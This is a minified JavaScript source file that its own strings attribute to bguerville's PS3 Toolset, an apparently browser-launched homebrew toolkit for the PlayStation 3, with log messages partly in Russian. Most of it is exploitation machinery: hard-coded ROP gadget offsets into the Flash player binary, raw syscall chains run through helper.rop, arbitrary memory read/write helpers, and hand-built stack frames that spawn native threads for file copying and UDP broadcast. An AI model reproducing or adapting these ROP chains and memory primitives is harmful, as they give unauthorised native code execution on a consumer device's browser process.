var getElapsedTime = function(e) {
    var r = (new Date - e) / 1e3,
        e = Math.round(r % 60).toString(),
        r = Math.floor(r / 60).toString();
    return 0 < r ? "Прошло времени: " + r + " мин " + e + " сек" : "Прошло времени: " + e + " сек"
};

function getMaxAvailableBuffer() {
    var e = helper.swf.getMaxAvailableBufferAllocSize();
    return helper.buffer.create(e - e % 65536)
}

function processJobList(e) {
    var t = [],
        s = [];
    $.each(e, function(e, r) {
        "file" === r.type ? t.push(r) : "folder" === r.type && s.push(r)
    }), 0 < s.length && makeDirectories(s), 0 < t.length && copyDispatcher(t)
}

function deleteFiles(e) {
    for (var r = 0; r < e.length; r++) deleteFile(e[r])
}

function removeDirectories(e) {
    for (var r = 0; r < e.length; r++) removeDir(e[r])
}

function makeDirectories(e) {
    for (var r = 0; r < e.length; r++) makeDir(e[r])
}

function copyDispatcher(e) {
    getMaxAvailableBuffer();
    var s = [],
        o = [],
        l = [];
    $.each(e, function(e, r) {
        r.error = {
            code: 0,
            msg: ""
        };
        new fileObject(fp1);
        var t = fsitem_getsize(r.src);
        return 0 === t ? (r.error.code = 2415919103, r.error.msg += "Файловый объект в режиме RO — нет данных для копирования", !0) : 4294967295 < t ? (r.error.code = 2415919103, r.error.msg += "Файловый объект в режиме RO - поддерживает файл до 4 Гб макс.", !0) : void(t <= 8192 ? s : t <= helper.mbytes ? o : l).push(r)
    })
}

function copyObject(e, r, t, s) {
    this.error = {
        code: 0,
        msg: ""
    };
    var o = new fileObject(e);
    if (0 === o.size) return this.error.code = 2415919103, void(this.error.msg += "Файловый объект в режиме RO — нет данных для копирования");
    if (4294967295 < o.size) return this.error.code = 2415919103, void(this.error.msg += "Файловый объект в режиме RO - поддерживает файл до 4 Гб макс.");
    if (this.error.code = o.open(), 0 === this.error.code) {
        var l = new fileObject(r);
        if (this.error.code = l.open(helper.fs_flag_create_append_rw), 0 === this.error.code) {
            var n = Math.floor(o.size / t),
                a = o.size - n * t,
                i = helper.heap.store(helper.sem_attr_fifo),
                p = 4 + 24 * (n + 1),
                d = helper.heap.store(p);
            libc.memset(d, 255, p);
            e = d;
            d += 4;
            var h = [],
                c = [],
                _ = [],
                f = [],
                u = [],
                r = 0;
            helper.rop.run(syscall32(helper.sys_sem_create, e, i, 0, 1)), r = helper.memory.upeek32(e);
            var g = p = syscall32(helper.sys_sem_wait, r, 0),
                e = syscall32(helper.sc_fs_read, o.fd, s, 286331153, 572662306) + store_r3_word(858993459),
                m = e.substr(0, 520),
                b = e.substr(536, 672),
                y = e.substr(1216),
                s = syscall32(helper.sc_fs_write, l.fd, s, 286331153, 572662306) + store_r3_word(858993459) + p,
                v = s.substr(0, 520),
                x = s.substr(536, 672),
                w = s.substr(1216);
            u[0] = "Многопоточные операции копирования файлов:<br>Поток BGXPLOIT_FXCOPY создан<br>";
            for (var k = 0; k < n; k++) h[k] = d, c[k] = d + 4, _[k] = d + 8, f[k] = d + 16, d += 24, g += m + _[k].toString32() + t.toString32() + b + h[k].toString32() + y + v + f[k].toString32() + t.toString32() + x + c[k].toString32() + w, u[k] += "<br>Копировать объект mt_read - Текущее смещение файла: 0x" + (k * t).toString32() + "<br>Копировать объект mt_write — Записанные данные: 0x" + t.toString32();
            if (0 < a && (h[n] = d, c[n] = d + 4, _[n] = d + 8, f[n] = d + 16, d += 24, g += m + _[n].toString32() + a.toString32() + b + h[n].toString32() + y + v + f[n].toString32() + a.toString32() + x + c[n].toString32() + w, u[n] += "<br>Копировать объект mt_read - Текущее смещение файла: 0x" + (n * t + a).toString32() + "<br>Копировать объект mt_write — данные скопированы: 0x" + a.toString32() + " байт"), (g += syscall32(helper.sc_fs_close, o.fd) + syscall32(helper.sc_fs_close, l.fd) + p).length / 2 % 8 != 0) return this.error.code = 1717986918, void(this.error.msg += "Недопустимый размер SF: 0x" + (g.length / 2).toString(16) + " байт");
            u[n] += "<br>Операции копирования объекта завершены";
            p = createThreadwithOPD(g, 0, "BGXPLOIT_FXCOPY", 200, 2048, prep_threading());
            0 === p.tid && (this.error.code = 2004318071, this.error.msg += "Ошибка создания потока"), this.thread_object = {
                tid: p.tid,
                rret: h,
                wret: c,
                log: u,
                stack_offset: p.stack_offset,
                sem_id: r,
                rlen: _,
                wlen: f
            }
        } else this.error.msg += "Файловый объект в режиме RW не может быть открыт"
    } else this.error.msg += "Файловый объект в режиме RO не может быть открыт"
}
var string = function(e, r) {
        function t(e) {
            if (e) return e;
            throw "string object deleted"
        }
        var s = !0 === r || !1 !== r,
            o = e || "";
        if (!1 === s && 0 < o.length % 2) throw "string invalid argument";
        var l = s ? e.length + 1 : e.length / 2,
            n = helper.heap.store(e, s);
        this.offset = function() {
            return t(n)
        }, this.length = function() {
            return s ? t(l) - 1 : t(l)
        }, this.peek = function() {
            return !0 === s && t(l) < 2 || !1 === s && t(l) < 1 ? "" : helper.memory.upeeks(t(n), s ? l : l - 1, s)
        }, this.poke = function(e, r) {
            if (null == e || !1 === r && 0 < e.length % 2) throw "string poke null or invalid argument";
            o = e;
            r = (s = !0 === r || !1 !== r) ? o.length + 1 : o.length / 2;
            l < r ? (helper.heap.free([t(n)]), n = helper.heap.store(o, s)) : helper.memory.upokes(t(n), o, s), l = o.length + 1
        }, this.gc = function() {
            helper.heap.free([t(n)]), l = o = n = null
        }
    },
    u32 = function(r) {
        function t(e) {
            if (e) return e;
            throw "u32 object deleted"
        }
        var s = r ? 4294967295 & parseInt(r) : 0,
            o = helper.heap.store(4);
        helper.memory.upoke32(t(o), s), this.offset = function() {
            return t(o)
        }, this.peek = function() {
            return helper.memory.upeek32(t(o))
        }, this.poke = function(e) {
            if (null == e || "number" != typeof r || 4294967295 < e) throw "u32 poke null or invalid argument";
            return s = 4294967295 & parseInt(e), helper.memory.upoke32(t(o), s), 0
        }, this.gc = function() {
            helper.heap.store([t(o)]), s = o = null
        }
    },
    u64 = function(e) {
        function r(e) {
            if (e) return e;
            throw "u64 object deleted"
        }
        var t = e ? bigInt.isUInt64(e) ? e : Uint64(e) : Uint64(0),
            s = helper.heap.store(t.toString64());
        this.offset = function() {
            return r(s)
        }, this.peek = function() {
            return Uint64(helper.memory.upeeks(r(s), 8))
        }, this.poke = function(e) {
            if (null == e || !bigInt.isUInt64(e) && "number" != typeof e && !("string" == typeof e && e.length <= 16)) throw "u64 poke null or invalid argument";
            t = bigInt.isUInt64(e) ? e : Uint64(e), helper.memory.upokes(r(s), t.toString64())
        }, this.gc = function() {
            helper.heap.store([r(s)]), t = s = null
        }
    },
    regexTester = function(e) {
        var r = e;
        this.filename_notchar = function() {
            return /^[^\\/:\*\#~!?" <>\|]+$/.test(r)
        }, this.start_notdot = function() {
            return /^\./.test(r)
        }, this.filename_notforbidden = function() {
            return /^(nul|prn|con|lpt[0-9]|com[0-9])(\.|$)/i.test(r)
        }
    },
    validateFileName = function(e) {
        var r = new regexTester(e);
        return 255 < e.length || !r.filename_notchar() || r.start_notdot() || r.filename_notforbidden()
    },
    UDPBroadcaster = function(e) {
        if (helper.worker.udp || (helper.worker.udp = new workerThread("BGTOOLSET_WKR_UDP")), !helper.worker.udp || !helper.worker.udp.getTLS) return null;
        var n = e || {
                fd: -1,
                sock_addr: 0,
                vsock_addr: helper.worker.udp.getTLS().offset,
                port: 0
            },
            a = helper.worker.udp.getTLS().offset + 256,
            i = !1,
            p = 0;
        this.open = function(e) {
            var r = 0;
            n.port = e || n.port;
            var t, s, o = !1;

            function l() {
                if (n.fd = helper.rop.rrun(syscall32(helper.sys_net_socket, helper.AF_INET, helper.SOCK_DGRAM, 0)), n.fd < 0) return Logger.debug("UDPBroadcaster.open: socket creation call returned error 0x" + helper.memory.upeek32(sysnet.sys_net_errno_loc()).toString(16)), r = -1;
                var e = helper.heap.store();
                if (helper.memory.upoke32(e, 1), r = helper.rop.rrun(syscall32(helper.sys_net_setsockopt, n.fd, 65535, 32, e, 4)), helper.heap.free([e]), r < 0) return Logger.debug("UDPBroadcaster.open: setsockopt call returned errno 0x" + helper.memory.upeek32(sysnet.sys_net_errno_loc()).toString(16)), r;
                o = !0
            }
            return n.fd < 0 && l(), n.sock_addr = helper.heap.store("1002" + parseInt(n.port).toString16() + helper.sFF32 + helper.snull64), helper.memory.upokes(n.vsock_addr, "1002" + parseInt(n.port).toString16() + helper.sFF32 + helper.snull64), n.sock_addr < 2147483648 ? (Logger.debug("UDPBroadcaster.open: failed to create sock_addr structure offset 0x" + n.sock_addr.toString(16)), this.close(), r = -1) : (Logger.debug("UDPBroadcaster.open: new socket created -> descriptor 0x" + n.fd.toString(16)), helper.cookies.set("udp_socket", n), i = !0, t = "\n>@bguerville's PS3 Toolset v" + helper.tversion + " - UDP Debug Broadcast: Hello ;-)\n>UDP Port: " + n.port + "\n>PS3 Socket ID: 0x" + n.fd.toString(16), s = helper.heap.store(t, !0), helper.rop.rrun(syscall32(helper.sys_net_sendto, n.fd, s, t.length, 0, n.sock_addr, 16)) < 0 ? (l(), helper.rop.run(syscall32(helper.sys_net_sendto, n.fd, s, t.length, 128, n.sock_addr, 16))) : o || (e = helper.heap.store(8), (r = helper.rop.rrun(syscall32(helper.sys_net_getsockopt, n.fd, 65535, 32, e, e + 4))) < 0 && Logger.debug("UDPBroadcaster.open: getsockopt call returned errno 0x" + helper.memory.upeek32(sysnet.sys_net_errno_loc()).toString(16)), 1 !== helper.memory.upeek32(e) && (l(), helper.rop.run(syscall32(helper.sys_net_sendto, n.fd, s, t.length, 128, n.sock_addr, 16))), helper.heap.free([e])), helper.heap.free([s])), 0 === r && 0 === p && (p = setInterval(d, 2500)), r
        };
        var r = "\n>PS3 Toolset v" + helper.tversion + " UDP Trace Broadcast: Good Bye";
        this.opened = function() {
            return i
        };
        var t = "";

        function d() {
            0 < t.length && (clearInterval(p), p = 0, s(t), t = "")
        }
        this.send = function(e) {
            n.fd < 0 ? (t = "", Logger.debug("UDPBroadcaster.send error: UDP connection not ready")) : 32768 < e.length ? Logger.debug("UDPBroadcaster.send overflowing error: resetting buffer") : t += "\n>" + e
        };
        var s = function(e) {
            for (var r = 1024, t = Math.floor(e.length / r), s = e.length - t * r, o = "", l = 0; l < t; l++) o += vsyscall32(helper.sys_net_sendto, n.fd, a + r * l, r, 128, n.vsock_addr, 16);
            0 < s && (o += vsyscall32(helper.sys_net_sendto, n.fd, a + t * r, s, 128, n.vsock_addr, 16)), helper.sm && helper.worker.udp && 0 < o.length && helper.worker.udp.run(o, "BC Send Job", function() {
                helper.memory.upokes(helper.worker.udp.getTLS().offset + 256, e, !0)
            }, function() {
                Logger.debug("progress: UDP Job sent"), p = setInterval(d, 2500)
            })
        };
        this.close = function() {
            var e;
            0 <= n.fd && (0 < p && (clearInterval(p), p = 0), e = helper.heap.store(r, !0), Logger.debug("UDPBroadcaster.close: socket closing -> descriptor 0x" + n.fd.toString(16) + " sock_addr at 0x" + n.sock_addr.toString(16)), 2147483648 < n.sock_addr && n.sock_addr < 2415919104 && helper.rop.run(syscall32(helper.sys_net_sendto, n.fd, e, r.length, 128, n.sock_addr, 16) + syscall32(helper.sys_net_close, n.fd)), Logger.debug("UDPBroadcaster.close: socket closed -> descriptor 0x" + n.fd.toString(16)), helper.cookies.remove("udp_socket"), helper.heap.free([n.sock_addr, e]), i = !1, n.fd = -1, n.sock_addr = 0, helper.bc = null)
        }
    };

function fill(e, r) {
    return hexh2bin(65535 & r).repeat((e % 2 == 1 ? e + 1 : e) / 2)
}

function hexh2bin(e) {
    return (e || 0).toString16()
}

function hexw2bin(e) {
    return (e || 0).toString32()
}

function hexdw2bin(e) {
    return u64_errchck("hexdw2bin", e = null == e ? helper.gtemp_addr : e), e.toString64()
}

function vhexdw2bin(e) {
    return helper.vtemp_addr = 0 < helper.vtemp_addr ? helper.vtemp_addr : allocator.malloc(4096) + 2048, u64_errchck("vhexdw2bin", e = null == e ? helper.vtemp_addr : e), e.toString64()
}

function u64_errchck(e, r) {
    !0 === bigInt.isInstance(r) && 64 < r.bitLength() && helper.error(e + ": integers > 64 bit are not supported by this function")
}

function Gadgets() {
    var e = helper.swf.getFP9TBase();
    this.fpdbase = helper.swf.getFP9DBase(), this.fptoc_addr = helper.swf.getFP9TOC(), this.ugadget1_addr = e + 521156, this.ugadget2_addr = e + 5384, this.ugadget3_addr = e + 1774560, this.ugadget4_addr = e + 1223552, this.ugadget5_addr = e + 209416, this.ugadget6_addr = e + 15656, this.ugadget7_addr = e + 427072, this.ugadget8_addr = e + 521160, this.ugadget9_addr = e + 785312, this.ugadget10_addr = e + 2545104, this.ugadget11_addr = e + 5049600, this.ugadget12_addr = e + 459124, this.ugadget13_addr = e + 3434548, this.ugadget14_addr = e + 4136204, this.ugadget15_addr = e + 841316, this.ugadget16_addr = e + 740276, this.ugadget17_addr = e + 11604, this.ugadget18_addr = e + 759384, this.ugadget19_addr = e + 1761124, this.ugadget20_addr = e + 2540892, this.ugadget21_addr = e + 4125300, this.ugadget22_addr = e + 915392, this.ugadget23_addr = e + 5088440, this.ugadget24_addr = e + 719456, this.ugadget25_addr = e + 916128, this.ugadget26_addr = e + 1190248, this.ugadget27_addr = e + 2924, this.ugadget28_addr = e + 57036
}
var libc = {
        memcpy: function(e, r, t) {
            return callf(564, e, r, t)
        },
        memcmp: function(e, r, t) {
            return callf(476, e, r, t)
        },
        memset: function(e, r, t) {
            return callf(388, e, r, t)
        },
        memmove: function(e, r, t) {
            return callf(392, e, r, t)
        },
        fopen: function(e, r) {
            return callf(396, e, r)
        },
        fclose: function(e) {
            return callf(496, e)
        },
        fread: function(e, r, t, s) {
            return callf(480, e, r, t, s)
        },
        fwrite: function(e, r, t, s) {
            return callf(512, e, r, t, s)
        },
        fseek: function(e, r, t) {
            return callf(400, e, r, t)
        },
        rename: function(e, r) {
            return callf(416, e, r)
        },
        unlink: function(e) {
            return callf(516, e)
        },
        stat: function(e, r) {
            return callf(404, e, r)
        },
        mkdir: function(e) {
            return callf(316, e)
        },
        opendir: function(e) {
            return callf(372, e)
        },
        closedir: function(e) {
            return callf(456, e)
        },
        readdir: function(e) {
            return callf(356, e)
        },
        rmdir: function(e) {
            return callf(424, e)
        },
        Geterrno: function() {
            return callf(376)
        },
        printf: function(e, r, t, s, o, l, n, a) {
            return callf(472, e, r, t, s, o, l, n, a)
        },
        sprintf: function(e, r, t, s, o, l, n, a) {
            return callf(352, e, r, t, s, o, l, n, a)
        }
    },
    sysprx = {
        lwmutex_create: function(e, r) {
            return callf(556, e, r)
        },
        lwmutex_destroy: function(e) {
            return callf(580, e)
        },
        lwmutex_lock: function(e, r) {
            return callf(532, e, r)
        },
        lwmutex_unlock: function(e) {
            return callf(536, e)
        },
        thread_create: function(e, r, t, s) {
            return callf(272, e, r, t, s)
        },
        thread_exit: function(e) {
            return callf(576, e)
        },
        sys_malloc: function(e) {
            return call(helper.vshgadgets_box.sysPrxForUser_sys_malloc_opd_addr, e)
        },
        sys_free: function(e) {
            return call(helper.vshgadgets_box.sysPrxForUser_sys_free_opd_addr, e)
        },
        sys_strlen: function(e) {
            return callf(552, e)
        }
    },
    allocator = {
        malloc: function(e) {
            return call(helper.vshgadgets_box.allocator_malloc_opd_addr, e)
        },
        free: function(e) {
            return call(helper.vshgadgets_box.allocator_free_opd_addr, e)
        }
    },
    sysnet = {
        socket: function(e, r, t) {
            return callf(628, e, r, t)
        },
        connect: function(e, r, t, s) {
            return callf(608, e, r, t, s)
        },
        close: function(e, r) {
            return callf(612, e, r)
        },
        recv: function(e, r, t, s) {
            return callf(644, e, r, t, s)
        },
        recvfrom: function(e, r, t, s, o, l) {
            return callf(596, e, r, t, s, o, l)
        },
        send: function(e, r, t, s) {
            return callf(640, e, r, t, s)
        },
        sendto: function(e, r, t, s, o, l) {
            return callf(624, e, r, t, s, o, l)
        },
        getsockopt: function(e, r, t, s, o) {
            return callf(604, e, r, t, s, o)
        },
        setsockopt: function(e, r, t, s, o) {
            return callf(620, e, r, t, s, o)
        },
        select: function() {
            return callf(600, pt1, pt2, sz)
        },
        gethostbyname: function(e) {
            return callf(616, e)
        },
        inet_addr: function(e) {
            return callf(636, e)
        },
        sys_net_errno_loc: function() {
            return call(helper.vshgadgets_box.sys_net__sys_net_errno_loc_opd_addr)
        },
        sys_net_errno: function() {
            return helper.memory.upeek32(this.sys_net_errno_loc())
        }
    },
    sdk = {
        cellCryptoPuSha256Hash: function(e, r, t) {
            return call(helper.vshgadgets_box.sdk_C7781115_opd_addr, e, r, t)
        },
        cellCryptoPuSha1Hash: function(e, r, t) {
            return call(helper.vshgadgets_box.sdk_C7781115_opd_addr - 160, e, r, t)
        }
    },
    buffer = function() {
        this.create = function(e) {
            var r = helper.swf.getMaxAvailableBufferAllocSize();
            return r < e && helper.error("create: Total buffer data storage is 64Mb max"), e = e && e <= r ? e : r, {
                offset: helper.swf.allocBuffer(e),
                size: e
            }
        }, this.free = function(e) {
            $.each(Array.isArray(e) ? e : [e], function(e, r) {
                2147483648 < r && helper.swf.freeBuffer(r)
            })
        }, this.reset = function() {
            helper.swf.clearBuffer()
        }
    },
    sysmem = function() {
        helper.wt_pool = [];
        var s = [],
            o = null,
            l = 19922944,
            n = null;

        function a() {
            var e = helper.heap.store(8),
                r = (helper.rop.rrun(syscall32(helper.sys_memory_container_get_size, e, helper.browser_container)), helper.memory.upeek32(e + 4));

            function t(e) {
                var r = helper.heap.store(4),
                    t = helper.rop.rrun(syscall32(helper.sys_memory_allocate_from_container, l, helper.browser_container, 1024, r));
                if (0 < t) {
                    Logger.debug("Browser memory container cannot provide any RAM");
                    var s = helper.heap.store(72);
                    if (!e || 0 !== helper.rop.rrun(syscall32(helper.sys_memory_get_page_attribute, e.offset, s)) || 0 !== helper.rop.rrun(syscall32(helper.sys_memory_get_page_attribute, e.offset + l - 4096, s + 36))) return Logger.error("sysmem: Error: 0x" + t.toString(16) + " - Failure to allocate 0x" + l.toString(16) + " buffer from browser container."), helper.heap.free([r, s]), o = null, void toast("Произошла фатальная ошибка выделения памяти, проверьте логи. Возможно, вам придется перезагрузить консоль, чтобы PS3 Toolset работал правильно.", "error", 8);
                    Logger.debug("Повторное использование ранее выделенной памяти контейнера из файла cookie сеанса"), o = {
                        offset: e.offset,
                        size: l
                    }, helper.heap.free([s])
                } else {
                    s = helper.memory.upeek32(r);
                    helper.heap.free([r]), Logger.debug("sysmem: Buffer allocated offset 0x" + s.toString(16) + " size 0x" + l.toString(16) + " - Available Free Memory 0x" + l.toString(16)), o = {
                        offset: s,
                        size: l
                    }
                }
                helper.cookies.set("sm_container", o)
            }
            helper.heap.free([e]), helper.cookies.get("sm_container") ? (Logger.debug("Найден файл cookie контейнера памяти"), e = helper.cookies.getJSON("sm_container"), r < l ? (Logger.debug("Повторное использование ранее выделенной памяти контейнера из файла cookie сеанса"), o = {
                offset: e.offset,
                size: e.size
            }) : (helper.cookies.remove("sm_container"), t(e))) : t(), o ? n = {
                offset: o.offset,
                size: 16777216
            } : Logger.error("borrow: sysmem allocation failed")
        }
        a(), this.getBuffer = function() {
            return n && 0 !== n.offset || (a(), n) ? n : (Logger.error("sysmem.getBuffer: global sysmem allocation failed"), null)
        }, this.ready = function() {
            return null !== o
        }, this.alloc = function(e) {
            if (!o && (a(), !o)) return Logger.error("sysmem.alloc: global sysmem allocation failed"), null;
            var r = null,
                t = o.offset + 16777216;
            switch (e) {
                case "BGTOOLSET_WKR_FMM":
                    r = {
                        offset: t,
                        size: 1048576
                    };
                    break;
                case "BGTOOLSET_WKR_UDP":
                    r = {
                        offset: t + 1048576,
                        size: 1048576
                    };
                    break;
                case "BGTOOLSET_WKR_FE":
                    r = {
                        offset: t + 2097152,
                        size: 1048576
                    }
            }
            return r && s.push(r), r
        }, this.free = function(r) {
            r && 0 < r.offset ? s = jQuery.grep(s, function(e) {
                return e === r && Logger.debug("sysmem.free: Freed System memory object " + r.offset.toString(16)), e !== r
            }) : Logger.info("sysmem.free: No System memory to free")
        }, this.close = function() {
            var e;
            helper.cookies.get("sm_container") && o && 0 < o.offset && (e = helper.heap.store(36), 0 === helper.rop.rrun(syscall32(helper.sys_memory_get_page_attribute, o.offset, e)) && (helper.rop.run(syscall32(helper.sys_memory_free, o.offset)), Logger.debug("sysmem.close: Buffer freed offset 0x" + o.offset.toString(16)), helper.sm = null, s = [], n = o = null), helper.heap.free([e]), helper.cookies.remove("sm_container"), Logger.info("Удален сеанс памяти контейнера"))
        }
    };

function FIFOQ() {
    this.elements = []
}

function LIFOQ() {
    this.elements = []
}
FIFOQ.prototype.length = function() {
    return this.elements.length
}, FIFOQ.prototype.get = function(e) {
    return this.elements[e]
}, FIFOQ.prototype.add = function(e) {
    this.elements.push(e)
}, FIFOQ.prototype.remove = function() {
    this.elements.shift()
}, FIFOQ.prototype.removeLast = function() {
    this.elements.pop()
}, FIFOQ.prototype.reset = function() {
    this.elements = []
}, FIFOQ.prototype.first = function() {
    return this.elements[0]
}, FIFOQ.prototype.last = function() {
    return this.elements[this.elements.length - 1]
}, LIFOQ.prototype.length = function() {
    return this.elements.length
}, LIFOQ.prototype.get = function(e) {
    return this.elements[e]
}, LIFOQ.prototype.add = function(e) {
    this.elements.push(e)
}, LIFOQ.prototype.remove = function() {
    this.elements.pop()
}, LIFOQ.prototype.removeLast = function() {
    this.elements.shift()
}, LIFOQ.prototype.reset = function() {
    this.elements = []
}, LIFOQ.prototype.first = function() {
    return this.elements[this.elements.length - 1]
}, LIFOQ.prototype.last = function() {
    return this.elements[0]
};
var workerThread = function(e) {
        if (2 < helper.wt_pool.length) return Logger.error("Максимальное количество рабочих потоков: 3"), null;
        if (0 < jQuery.grep(helper.wt_pool, function(e) {
                return e === r
            }).length) return Logger.error("Название потока уже используется"), null;
        var r = e,
            t = helper.wt_pool,
            s = helper.vtemp_addr;
        if (helper.wt_pool.push(r), !helper.sm && (helper.sm = new sysmem, !helper.sm)) return Logger.error("Не удалось создать рабочий поток helper.sm"), helper.wt_pool = t, null;
        var o = helper.sm.alloc(r);
        if (!o) return Logger.error("Ошибка выделения локального хранилища рабочего потока"), helper.wt_pool = t, null;
        helper.vtemp_addr = o.offset + o.size - 16384, this.getTLS = function() {
            return o || alert("Ошибка TLS"), o
        };
        var e = o.offset + 131072,
            l = new semaphoreObject(helper.sem_attr_fifo);
        if (0 < l.create()) return Logger.error("Ошибка создания рабочего процесса: не удалось получить семафор"), helper.vtemp_addr = s, helper.wt_pool = t, null;
        var n = helper.vshgadgets_box.vgadget9_addr.toString32() + helper.vshgadgets_box.vtoc_addr.toString32() + fill(32, helper.dbyte41) + helper.vshgadgets_box.vtoc_addr.toString64() + fill(64, helper.dbyte41) + vsyscall32(helper.sys_sem_wait, l.id(), 0),
            a = vset_r3to11(e, 0, 0, 0, 0, 0, 0, 0, 0) + fill(16, helper.dbyte41) + vhexdw2bin(helper.vshgadgets_box.vgadget10_addr);
        helper.memory.upokes(e, (e - 20).toString64() + helper.vshgadgets_box.vgadget10_addr.toString32() + helper.vshgadgets_box.vtoc_addr.toString32() + (e + 8).toString32() + (e + 4096).toString32() + "0000000000000000" + r.toAscii8()), sf = n + a, 425984 < sf.length && Logger.warn("Worker Thread " + r + " SF bytelength: 0x" + (2 * sf.length).toString(16)), helper.memory.upokes(e + 4096, sf), helper.rop.run(syscall32(helper.sys_ppu_thread_create, e + 24, e + 16, e, 0, 201, 4096, 0, e + 32));
        t = helper.memory.upeek32(e + 28);
        helper.rop.run(syscall32(helper.sys_ppu_thread_start, t)), Logger.info("Started Worker Thread with ID: 0x" + t.toString(16));
        var i = {
            id: t,
            stack_offset: e + 4096,
            stack_size: sf.length / 2,
            sem_id: l.id(),
            tls: o
        };
        Logger.debug("thread id : 0x" + i.id.toString(16)), Logger.debug("semaphore id : 0x" + i.sem_id.toString(16)), Logger.debug("tls offset : 0x" + i.tls.offset.toString(16)), Logger.debug("stack offset : 0x" + i.stack_offset.toString(16)), helper.cookies.set(r, i);
        var p = new FIFOQ;
        this.getQlength = function() {
            return p.length()
        };
        var d = new mutexObject(helper.mtx_attr_fifo);
        d.create(), this.getMutex = function() {
            return d
        };
        var h = 0,
            c = !1,
            _ = !1,
            f = function() {
                if (0 !== p.length()) {
                    var e = l.numWaitThreads();
                    if (e <= 0 || !0 === c) return e < 0 ? Logger.debug("semaphore numWaitThreads returned -1") : Logger.debug("semaphore numWaitThreads returned " + e.toString(16)), void Logger.debug(!0 === c ? "worker busy" : "worker free");
                    c = !0, b(), _ = !0;
                    var r = p.first();
                    r ? (p.remove(), _ = !1, helper.memory.upokes(i.stack_offset, (e = vsyscall32(helper.sys_mutex_lock, d.id(), 0) + r.sf + vsyscall32(helper.sys_mutex_unlock, d.id()), n + e + a)), r.pre_callback && r.pre_callback(), l.fast_post(), r.post_callback ? setTimeout(function() {
                        ! function e(r) {
                            var t = l.numWaitThreads();
                            if (t <= 0) return Logger.debug("Worker busy, postcallback postponed! semval = " + t.toString(16)), void setTimeout(function() {
                                e(r)
                            }, 100);
                            Logger.debug("running post_callback"), 0 === r.index || 4294967295 === r.index ? setTimeout(function() {
                                $.Deferred().done(r.post_callback).resolve()
                            }, 1e3) : (r.post_callback(), m(), c = !1)
                        }(r)
                    }, 100) : (m(), c = !1)) : (_ = !1, m(), c = !1)
                } else b()
            },
            u = 0,
            g = 0;

        function m() {
            0 === u && 0 < p.length() ? (clearInterval(g), g = 0, u = setInterval(f, 200)) : 0 === g && (g = setInterval(m, 1e3))
        }

        function b() {
            0 < u && (clearInterval(u), u = 0)
        }
        this.run = function(e, r, t, s) {
            var l = function(e, r, t, s, o) {
                !0 !== _ ? i ? (p.add({
                    index: e,
                    sf: r,
                    name: t,
                    pre_callback: s,
                    post_callback: o
                }), m()) : Logger.warn("Worker Thread Closed - Cannot run stack frames") : setTimeout(function() {
                    l(e, r, t, s, o)
                }, 0)
            };
            l(++h, e, r, t, s)
        };

        function y() {
            var e;
            b(), d.close(), l.close(), delete l, l = null, helper.cookies.remove(r), i = null, helper.sm.free(o), o = null, "BGTOOLSET_WKR_FMM" === r ? helper.worker.fmm = null : "BGTOOLSET_WKR_UDP" === r ? helper.worker.udp = null : "BGTOOLSET_WKR_FE" === r && (helper.worker.fe = null), helper.wt_pool = jQuery.grep(helper.wt_pool, function(e) {
                return e !== r
            }), 0 === helper.wt_pool.length || (helper.worker.fmm ? (e = helper.worker.fmm.getTLS(), helper.vtemp_addr = e.offset + e.size - 16384) : helper.worker.udp ? (e = helper.worker.udp.getTLS(), helper.vtemp_addr = e.offset + e.size - 16384) : helper.worker.fe && (e = helper.worker.fe.getTLS(), helper.vtemp_addr = e.offset + e.size - 16384))
        }

        function v() {
            Logger.debug("Closing " + r + " Thread ID: " + i.id.toString(16))
        }
        this.cancel = function(e) {
            var r = function() {
                !0 !== _ ? (p.reset(), i && e ? (p.add({
                    index: 0,
                    sf: vsyscall32(helper.sys_ppu_thread_exit),
                    name: "Cancel",
                    pre_callback: v,
                    post_callback: y
                }), m()) : b()) : setTimeout(r, 0)
            };
            r()
        }, this.close = function() {
            var e = function() {
                !0 !== _ ? i ? (p.add({
                    index: 4294967295,
                    sf: vsyscall32(helper.sys_ppu_thread_exit),
                    name: "Close",
                    pre_callback: v,
                    post_callback: y
                }), m()) : Logger.info("Worker Thread Already Closed") : setTimeout(e, 0)
            };
            e()
        }, window.onunload = function(e) {
            throw helper.bc && helper.bc.close(), 0 < helper.wt_pool.length && clearThreadSession(), "onunload"
        }
    },
    holder = [],
    clearThreadSession = function(e) {
        for (var r, t, s, o, l, n = 0; n < helper.wt_pool.length; n++) helper.cookies.get(helper.wt_pool[n]) ? (r = helper.cookies.getJSON(helper.wt_pool[n]), t = helper.heap.store(4), 0 === (s = helper.rop.rrun(syscall32(helper.sys_ppu_thread_getprio, r.id, t))) && 201 === helper.memory.upeek32(t) ? (o = helper.vshgadgets_box.vgadget9_addr.toString32() + helper.vshgadgets_box.vtoc_addr.toString32() + fill(32, helper.dbyte41) + helper.vshgadgets_box.vtoc_addr.toString64() + fill(64, helper.dbyte41) + vsyscall32(helper.sys_sem_wait, r.sem_id, 0) + vsyscall32(helper.sys_ppu_thread_exit), helper.memory.upokes(r.stack_offset, o), holder.push({
            t: r,
            name: helper.wt_pool[n]
        }), l = 0, function e() {
            0 !== helper.rop.rrun(syscall32(helper.sys_sem_post, r.sem_id, 1)) ? 16 < l || (l++, e()) : helper.rop.run(syscall32(helper.sys_sem_close, r.sem_id))
        }()) : Logger.warn(0 < s ? "Thread ID Session GC failure - Error: 0x" + s.toString(16) : "Thread ID Session GC failure - Priority: 0x" + helper.memory.upeek32(t).toString(16)), helper.heap.free([t]), helper.cookies.remove(helper.wt_pool[n])) : Logger.info("No GC required for Thread " + helper.wt_pool[n]);
        setTimeout(function() {
            for (var e = 0; e < holder.length; e++) {
                var r = helper.heap.store(4);
                0 === helper.rop.rrun(syscall32(helper.sys_ppu_thread_getprio, holder[e].t.id, r)) && 201 === helper.memory.upeek32(r) ? Logger.info("GC Exit failed for Thread " + holder[e].name + " Thread ID 0x" + holder[e].t.id.toString(16)) : Logger.info("GC Exit Thread " + holder[e].name + " Thread ID 0x" + holder[e].t.id.toString(16)), helper.sm && helper.sm.free(holder[e].t.tls), helper.heap.free([r])
            }
            holder = []
        }, 2500), helper.wt_pool = [], helper.sm && !e && helper.sm.close()
    },
    heap = function() {
        var r = [];
        this.store = function(e, r) {
            return null == e ? e = helper.snull32 : "number" == typeof e ? e = fill(e, 0) : "string" == typeof e && !0 === r && (e = e.toAscii8()), 15728640 < e.length && helper.error("heap.store: Total heap data storage is 15Mb, use helper.buffer.create(size) if you need larger buffers up to 64Mb"), helper.swf.storeData(e)
        }, this.free = function(e) {
            $.each(Array.isArray(e) ? e : [e], function(e, r) {
                2147483648 < r && helper.swf.freeData(r)
            })
